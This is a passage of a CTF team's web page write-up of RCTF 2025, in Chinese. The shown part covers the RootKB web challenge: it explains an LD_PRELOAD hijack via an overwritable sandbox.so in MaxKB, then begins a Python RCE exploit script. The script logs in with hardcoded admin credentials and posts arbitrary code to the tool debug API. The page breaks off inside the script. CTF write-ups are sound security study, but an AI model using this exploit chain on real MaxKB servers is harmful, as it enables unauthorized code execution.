<!doctype html><html lang=en itemscope itemtype=http://schema.org/WebPage><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=1"><title>2025 RCTF SU WriteUp -</title><meta name=description content="本次 RCTF 我们 SU 取得了 第五名 的成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，欢迎发送个人简介至：suers_xctf@126.com 或者直接联系baozongwi QQ:2405758945。
以下是我们 SU 本次 2025 RCTF 的 WriteUp。"><meta name=author content="SUer"><script type=application/ld+json>{"@context":"http://schema.org","@type":"WebSite","name":"su-team","url":"https:\/\/su-team.cn\/"}</script><script type=application/ld+json>{"@context":"http://schema.org","@type":"Organization","name":"","url":"https:\/\/su-team.cn\/"}</script><script type=application/ld+json>{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"https:\/\/su-team.cn\/","name":"home"}},{"@type":"ListItem","position":3,"item":{"@id":"https:\/\/su-team.cn\/post\/rctf-2025-su-wu\/","name":"2025 rctf su write up"}}]}</script><script type=application/ld+json>{"@context":"http://schema.org","@type":"Article","author":{"name":"SUer"},"headline":"2025 RCTF SU WriteUp","description":"本次 RCTF 我们 SU 取得了 第五名 的成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，欢迎发送个人简介至：suers_xctf@126.com 或者直接联系baozongwi QQ:2405758945。\n以下是我们 SU 本次 2025 RCTF 的 WriteUp。\n","inLanguage":"en","wordCount":16365,"datePublished":"2025-11-18T00:54:51\u002b00:00","dateModified":"2025-11-18T00:54:51\u002b00:00","image":"https:\/\/su-team.cn\/img\/SU.jpg","keywords":["RCTF"],"mainEntityOfPage":"https:\/\/su-team.cn\/post\/rctf-2025-su-wu\/","publisher":{"@type":"Organization","name":"https:\/\/su-team.cn\/","logo":{"@type":"ImageObject","url":"https:\/\/su-team.cn\/img\/SU.jpg","height":60,"width":60}}}</script><meta property="og:title" content="2025 RCTF SU WriteUp"><meta property="og:description" content="本次 RCTF 我们 SU 取得了 第五名 的成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，欢迎发送个人简介至：suers_xctf@126.com 或者直接联系baozongwi QQ:2405758945。
以下是我们 SU 本次 2025 RCTF 的 WriteUp。"><meta property="og:image" content="https://su-team.cn/img/SU.jpg"><meta property="og:url" content="https://su-team.cn/post/rctf-2025-su-wu/"><meta property="og:type" content="website"><meta property="og:site_name" content="su-team"><meta name=twitter:title content="2025 RCTF SU WriteUp"><meta name=twitter:description content="本次 RCTF 我们 SU 取得了 第五名 的成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，欢迎发送个人简介至：suers_xctf@126.com 或者直接联系baozongwi QQ:2405758945。
以下是我们 SU 本次 2025 RCTF 的 WriteUp。"><meta name=twitter:image content="https://su-team.cn/img/SU.jpg"><meta name=twitter:card content="summary_large_image"><link href=https://su-team.cn/img/SU.jpg rel=icon type=image/x-icon><meta name=generator content="Hugo 0.148.2"><link rel=alternate href=https://su-team.cn/index.xml type=application/rss+xml title=su-team><link rel=stylesheet href=https://su-team.cn/css/katex.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/brands.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/fontawesome.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/regular.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/solid.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/svg.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/svg-with-js.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/v4-font-face.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/v4-shims.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/v5-font-face.min.css><link rel=stylesheet href=https://su-team.cn/css/bootstrap.min.css><link rel=stylesheet href=https://su-team.cn/css/main.css><link rel=stylesheet href=https://su-team.cn/css/fonts.css><link rel=stylesheet href=https://su-team.cn/css/syntax.css><link rel=stylesheet href="https://su-team.cn/css/codeblock.css?v=20260212-fix3"><link rel=stylesheet href=https://su-team.cn/css/photoswipe.min.css><link rel=stylesheet href=https://su-team.cn/css/photoswipe.default-skin.min.css><style>.navbar-custom .avatar-container{width:58px;height:58px;margin-top:-29px;left:50%;transform:translateX(-50%);display:flex;align-items:center;justify-content:center;background:#fff;border-radius:50%;box-shadow:0 6px 18px rgba(0,0,0,.12)}.navbar-custom .avatar-container .avatar-img-border{width:100%;height:100%;border-radius:50%;overflow:hidden;margin:0;box-shadow:none}.navbar-custom .avatar-container .avatar-img{width:100%;height:100%;object-fit:cover;border-radius:50%}@media only screen and (min-width:768px){.navbar-custom .avatar-container{width:72px;height:72px;margin-top:-36px}}</style></head><body><nav class="navbar navbar-default navbar-fixed-top navbar-custom"><div class=container-fluid><div class=navbar-header><button type=button class=navbar-toggle data-toggle=collapse data-target=#main-navbar>
<span class=sr-only>Toggle navigation</span>
<span class=icon-bar></span>
<span class=icon-bar></span>
<span class=icon-bar></span>
</button>
<a class="theme-toggle mobile-theme-toggle" href=javascript:void(0) onclick=toggleTheme() title="Toggle Theme"><span class=sr-only>Toggle Theme</span>
<svg class="theme-icon-moon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg class="theme-icon-sun" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg>
</a><a class=navbar-brand href=https://su-team.cn/>su-team</a></div><div class="collapse navbar-collapse" id=main-navbar><ul class="nav navbar-nav navbar-right"><li><a title=Archives href=/>Archives</a></li><li class=navlinks-container><a class=navlinks-parent role=button tabindex=0>Members</a><div class=navlinks-children><a href=/active-members>Members</a>
<a href=/pioneers>Pioneers</a></div></li><li><a title=About href=/page/about/>About</a></li><li><a title=Tags href=/tags>Tags</a></li><li class=hidden-xs><a href=javascript:void(0) class=theme-toggle onclick=toggleTheme() title="Toggle Theme"><span class=sr-only>Toggle Theme</span>
<svg class="theme-icon-moon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg class="theme-icon-sun" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></a></li></ul></div></div></nav><script>(function(){const e=localStorage.getItem("theme"),t=window.matchMedia("(prefers-color-scheme: dark)").matches;e==="dark"||!e&&t?document.body.classList.add("dark-mode"):document.body.classList.remove("dark-mode")})();function toggleTheme(){const e=document.body;e.classList.toggle("dark-mode"),e.classList.contains("dark-mode")?localStorage.setItem("theme","dark"):localStorage.setItem("theme","light")}</script><style>.theme-toggle{cursor:pointer;padding:15px;display:flex;align-items:center}.mobile-theme-toggle{float:right;padding:15px 10px;margin-top:2px}@media(min-width:768px){.mobile-theme-toggle{display:none !important}}.theme-icon-moon,.theme-icon-sun{color:#777;transition:color .3s,transform .3s}.theme-toggle:hover .theme-icon-moon,.theme-toggle:hover .theme-icon-sun{color:#333}.theme-icon-sun{display:none}.theme-icon-moon{display:block}body.dark-mode .theme-icon-sun{display:block;color:#000}body.dark-mode .theme-icon-moon{display:none}body.dark-mode{filter:none !important;background-color:#1a1a1a !important}body.dark-mode header,body.dark-mode .container,body.dark-mode footer{filter:invert(1)hue-rotate(180deg)}body.dark-mode .navbar-custom{background-color:#1a1a1a !important;border-bottom:1px solid #333}body.dark-mode .navbar-custom .container-fluid{filter:invert(1)hue-rotate(180deg)}body.dark-mode img,body.dark-mode video,body.dark-mode iframe,body.dark-mode .avatar-img,body.dark-mode .navbar-custom .avatar-container{filter:invert(1)hue-rotate(180deg)}</style><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
<button class="pswp__button pswp__button--share" title=Share></button>
<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
</button>
<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><header class=header-section><div class="intro-header no-img"><div class=container><div class=row><div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1"><div class=post-heading><h1>2025 RCTF SU WriteUp</h1><span class=post-meta><i class="fas fa-calendar"></i>&nbsp;Posted on November 18, 181151
&nbsp;|&nbsp;<i class="fas fa-clock"></i>&nbsp;77&nbsp;min
&nbsp;|&nbsp;<i class="fas fa-book"></i>&nbsp;16365&nbsp;words
&nbsp;|&nbsp;<i class="fas fa-user"></i>&nbsp;SUer</span></div></div></div></div></div></header><div class=container role=main><div class="row flex-row"><div class="col-lg-3 col-lg-offset-0 col-md-3 col-md-offset-0 hidden-sm hidden-xs"><div class=toc-sidebar><h4 class=toc-title>#<br>TABLE OF CONTENTS</h4><div class=toc-card><nav id=TableOfContents><ul><li><a href=#web>Web</a><ul><li><a href=#rootkb>RootKB</a></li><li><a href=#rootkb-1>RootKB&ndash;</a></li><li><a href=#maybe_easy>maybe_easy</a></li><li><a href=#photographer>photographer</a></li><li><a href=#auth>auth</a></li><li><a href=#ultimatefreeloader>UltimateFreeloader</a></li><li><a href=#author>author</a></li></ul></li><li><a href=#misc>Misc</a><ul><li><a href=#signin>Signin</a></li><li><a href=#speak-softly-love>Speak Softly Love</a></li><li><a href=#wanna-feel-love>Wanna Feel Love</a></li><li><a href=#shadows-of-asgard>Shadows of Asgard</a></li><li><a href=#the-alchemists-cage>The Alchemist&rsquo;s Cage</a></li><li><a href=#asgard-fallen-down>Asgard Fallen Down</a></li><li><a href=#vault>vault</a></li></ul></li><li><a href=#pwn>Pwn</a><ul><li><a href=#only>only</a></li><li><a href=#only_rev>only_rev</a></li><li><a href=#no_check_wasm>no_check_WASM</a></li></ul></li><li><a href=#crypto>Crypto</a><ul><li><a href=#suanp01y>SuanP01y</a></li><li><a href=#suanhash>SuanHash</a></li><li><a href=#repairing>RePairing</a></li></ul></li><li><a href=#reverse>Reverse</a><ul><li><a href=#chaos>Chaos</a></li><li><a href=#chaos2>chaos2</a></li><li><a href=#onion>Onion</a></li></ul></li></ul></nav></div></div></div><div class="col-lg-9 col-md-9"><article role=main class=blog-post><p>本次 RCTF 我们 SU 取得了 第五名 的成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，欢迎发送个人简介至：suers_<a href=mailto:xctf@126.com>xctf@126.com</a> 或者直接联系baozongwi QQ:2405758945。</p><p>以下是我们 SU 本次 2025 RCTF 的 WriteUp。</p><p><img src=/img/2025-RCTF/0.png alt=img></p><h1 id=web>Web</h1><h2 id=rootkb>RootKB</h2><p>当时看见这题俺都惊了，为什么最新版本7~8解，低版本0解</p><img src=/img/2025-RCTF/1.png alt=img width=50%><p>在pycharm 上对比发现 v2.3.1 和 v2.3.0 改动发现添加了sandbox.so 和 LD_PRELOAD 环境变量且sandbox.so 允许被覆盖，那么参考 LD_PRELOAD 劫持即可</p><p><img src=/img/2025-RCTF/2.png alt=img></p><p>感觉开发者的修法好抽象，用sandbox.so修复了一个SSRF结果又来一个RCE，俺也不知道俺也不敢问</p><img src=/img/2025-RCTF/3.png alt=img width=50%><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span><span class=lnt>119
</span><span class=lnt>120
</span><span class=lnt>121
</span><span class=lnt>122
</span><span class=lnt>123
</span><span class=lnt>124
</span><span class=lnt>125
</span><span class=lnt>126
</span><span class=lnt>127
</span><span class=lnt>128
</span><span class=lnt>129
</span><span class=lnt>130
</span><span class=lnt>131
</span><span class=lnt>132
</span><span class=lnt>133
</span><span class=lnt>134
</span><span class=lnt>135
</span><span class=lnt>136
</span><span class=lnt>137
</span><span class=lnt>138
</span><span class=lnt>139
</span><span class=lnt>140
</span><span class=lnt>141
</span><span class=lnt>142
</span><span class=lnt>143
</span><span class=lnt>144
</span><span class=lnt>145
</span><span class=lnt>146
</span><span class=lnt>147
</span><span class=lnt>148
</span><span class=lnt>149
</span><span class=lnt>150
</span><span class=lnt>151
</span><span class=lnt>152
</span><span class=lnt>153
</span><span class=lnt>154
</span><span class=lnt>155
</span><span class=lnt>156
</span><span class=lnt>157
</span><span class=lnt>158
</span><span class=lnt>159
</span><span class=lnt>160
</span><span class=lnt>161
</span><span class=lnt>162
</span><span class=lnt>163
</span><span class=lnt>164
</span><span class=lnt>165
</span><span class=lnt>166
</span><span class=lnt>167
</span><span class=lnt>168
</span><span class=lnt>169
</span><span class=lnt>170
</span><span class=lnt>171
</span><span class=lnt>172
</span><span class=lnt>173
</span><span class=lnt>174
</span><span class=lnt>175
</span><span class=lnt>176
</span><span class=lnt>177
</span><span class=lnt>178
</span><span class=lnt>179
</span><span class=lnt>180
</span><span class=lnt>181
</span><span class=lnt>182
</span><span class=lnt>183
</span><span class=lnt>184
</span><span class=lnt>185
</span><span class=lnt>186
</span><span class=lnt>187
</span><span class=lnt>188
</span><span class=lnt>189
</span><span class=lnt>190
</span><span class=lnt>191
</span><span class=lnt>192
</span><span class=lnt>193
</span><span class=lnt>194
</span><span class=lnt>195
</span><span class=lnt>196
</span><span class=lnt>197
</span><span class=lnt>198
</span><span class=lnt>199
</span><span class=lnt>200
</span><span class=lnt>201
</span><span class=lnt>202
</span><span class=lnt>203
</span><span class=lnt>204
</span><span class=lnt>205
</span><span class=lnt>206
</span><span class=lnt>207
</span><span class=lnt>208
</span><span class=lnt>209
</span><span class=lnt>210
</span><span class=lnt>211
</span><span class=lnt>212
</span><span class=lnt>213
</span><span class=lnt>214
</span><span class=lnt>215
</span><span class=lnt>216
</span><span class=lnt>217
</span><span class=lnt>218
</span><span class=lnt>219
</span><span class=lnt>220
</span><span class=lnt>221
</span><span class=lnt>222
</span><span class=lnt>223
</span><span class=lnt>224
</span><span class=lnt>225
</span><span class=lnt>226
</span><span class=lnt>227
</span><span class=lnt>228
</span><span class=lnt>229
</span><span class=lnt>230
</span><span class=lnt>231
</span><span class=lnt>232
</span><span class=lnt>233
</span><span class=lnt>234
</span><span class=lnt>235
</span><span class=lnt>236
</span><span class=lnt>237
</span><span class=lnt>238
</span><span class=lnt>239
</span><span class=lnt>240
</span><span class=lnt>241
</span><span class=lnt>242
</span><span class=lnt>243
</span><span class=lnt>244
</span><span class=lnt>245
</span><span class=lnt>246
</span><span class=lnt>247
</span><span class=lnt>248
</span><span class=lnt>249
</span><span class=lnt>250
</span><span class=lnt>251
</span><span class=lnt>252
</span><span class=lnt>253
</span><span class=lnt>254
</span><span class=lnt>255
</span><span class=lnt>256
</span><span class=lnt>257
</span><span class=lnt>258
</span><span class=lnt>259
</span><span class=lnt>260
</span><span class=lnt>261
</span><span class=lnt>262
</span><span class=lnt>263
</span><span class=lnt>264
</span><span class=lnt>265
</span><span class=lnt>266
</span><span class=lnt>267
</span><span class=lnt>268
</span><span class=lnt>269
</span><span class=lnt>270
</span><span class=lnt>271
</span><span class=lnt>272
</span><span class=lnt>273
</span><span class=lnt>274
</span><span class=lnt>275
</span><span class=lnt>276
</span><span class=lnt>277
</span><span class=lnt>278
</span><span class=lnt>279
</span><span class=lnt>280
</span><span class=lnt>281
</span><span class=lnt>282
</span><span class=lnt>283
</span><span class=lnt>284
</span><span class=lnt>285
</span><span class=lnt>286
</span><span class=lnt>287
</span><span class=lnt>288
</span><span class=lnt>289
</span><span class=lnt>290
</span><span class=lnt>291
</span><span class=lnt>292
</span><span class=lnt>293
</span><span class=lnt>294
</span><span class=lnt>295
</span><span class=lnt>296
</span><span class=lnt>297
</span><span class=lnt>298
</span><span class=lnt>299
</span><span class=lnt>300
</span><span class=lnt>301
</span><span class=lnt>302
</span><span class=lnt>303
</span><span class=lnt>304
</span><span class=lnt>305
</span><span class=lnt>306
</span><span class=lnt>307
</span><span class=lnt>308
</span><span class=lnt>309
</span><span class=lnt>310
</span><span class=lnt>311
</span><span class=lnt>312
</span><span class=lnt>313
</span><span class=lnt>314
</span><span class=lnt>315
</span><span class=lnt>316
</span><span class=lnt>317
</span><span class=lnt>318
</span><span class=lnt>319
</span><span class=lnt>320
</span><span class=lnt>321
</span><span class=lnt>322
</span><span class=lnt>323
</span><span class=lnt>324
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=ch>#!/usr/bin/env python3</span>
</span></span><span class=line><span class=cl><span class=c1># -*- coding: utf-8 -*-</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>MaxKB RCE Exploit - Complete Attack Chain
</span></span></span><span class=line><span class=cl><span class=s2>增加：远程写文件功能 write_remote_file()
</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>json</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>sys</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>os</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>base64</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>textwrap</span>
</span></span><span class=line><span class=cl><span class=c1># Target configuration</span>
</span></span><span class=line><span class=cl><span class=n>TARGET_URL</span> <span class=o>=</span> <span class=s2>&#34;http://web-rootkb-minusminus-54b389641de5.rctf.rois.team&#34;</span>
</span></span><span class=line><span class=cl><span class=n>USERNAME</span> <span class=o>=</span> <span class=s2>&#34;admin&#34;</span>
</span></span><span class=line><span class=cl><span class=n>PASSWORD</span> <span class=o>=</span> <span class=s2>&#34;MaxKB@123..&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># API endpoints</span>
</span></span><span class=line><span class=cl><span class=n>API_BASE</span> <span class=o>=</span> <span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>TARGET_URL</span><span class=si>}</span><span class=s2>/admin/api&#34;</span>
</span></span><span class=line><span class=cl><span class=n>TOOL_DEBUG_API</span> <span class=o>=</span> <span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>API_BASE</span><span class=si>}</span><span class=s2>/workspace/default/tool/debug&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Session setup</span>
</span></span><span class=line><span class=cl><span class=n>session</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>session</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>session</span><span class=o>.</span><span class=n>headers</span><span class=o>.</span><span class=n>update</span><span class=p>({</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;User-Agent&#39;</span><span class=p>:</span> <span class=s1>&#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;Content-Type&#39;</span><span class=p>:</span> <span class=s1>&#39;application/json&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;Accept&#39;</span><span class=p>:</span> <span class=s1>&#39;application/json&#39;</span>
</span></span><span class=line><span class=cl><span class=p>})</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>login</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34;Login to MaxKB and get JWT token&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>login_data</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;username&#34;</span><span class=p>:</span> <span class=n>USERNAME</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;password&#34;</span><span class=p>:</span> <span class=n>PASSWORD</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;captcha&#34;</span><span class=p>:</span> <span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=n>login_api</span> <span class=o>=</span> <span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>API_BASE</span><span class=si>}</span><span class=s2>/user/login&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>resp</span> <span class=o>=</span> <span class=n>session</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>login_api</span><span class=p>,</span> <span class=n>json</span><span class=o>=</span><span class=n>login_data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>resp</span><span class=o>.</span><span class=n>status_code</span> <span class=o>==</span> <span class=mi>200</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>result</span> <span class=o>=</span> <span class=n>resp</span><span class=o>.</span><span class=n>json</span><span class=p>()</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=s1>&#39;data&#39;</span> <span class=ow>in</span> <span class=n>result</span> <span class=ow>and</span> <span class=n>result</span><span class=p>[</span><span class=s1>&#39;data&#39;</span><span class=p>]</span> <span class=ow>and</span> <span class=s1>&#39;token&#39;</span> <span class=ow>in</span> <span class=n>result</span><span class=p>[</span><span class=s1>&#39;data&#39;</span><span class=p>]:</span>
</span></span><span class=line><span class=cl>                <span class=n>token</span> <span class=o>=</span> <span class=n>result</span><span class=p>[</span><span class=s1>&#39;data&#39;</span><span class=p>][</span><span class=s1>&#39;token&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>                <span class=n>session</span><span class=o>.</span><span class=n>headers</span><span class=p>[</span><span class=s1>&#39;AUTHORIZATION&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=sa>f</span><span class=s1>&#39;Bearer </span><span class=si>{</span><span class=n>token</span><span class=si>}</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl>                <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[+] Login successful!&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[+] JWT Token: </span><span class=si>{</span><span class=n>token</span><span class=p>[:</span><span class=mi>50</span><span class=p>]</span><span class=si>}</span><span class=s2>...&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=kc>True</span>
</span></span><span class=line><span class=cl>            <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[-] Login failed: </span><span class=si>{</span><span class=n>result</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=kc>False</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[-] Login request failed: </span><span class=si>{</span><span class=n>resp</span><span class=o>.</span><span class=n>status_code</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=kc>False</span>
</span></span><span class=line><span class=cl>    <span class=k>except</span> <span class=ne>Exception</span> <span class=k>as</span> <span class=n>e</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[-] Login error: </span><span class=si>{</span><span class=n>e</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=kc>False</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>execute_python_code</span><span class=p>(</span><span class=n>code</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34;Execute Python code through tool debug endpoint&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;code&#34;</span><span class=p>:</span> <span class=n>code</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;input_field_list&#34;</span><span class=p>:</span> <span class=p>[],</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;init_field_list&#34;</span><span class=p>:</span> <span class=p>[],</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;init_params&#34;</span><span class=p>:</span> <span class=p>{},</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;debug_field_list&#34;</span><span class=p>:</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
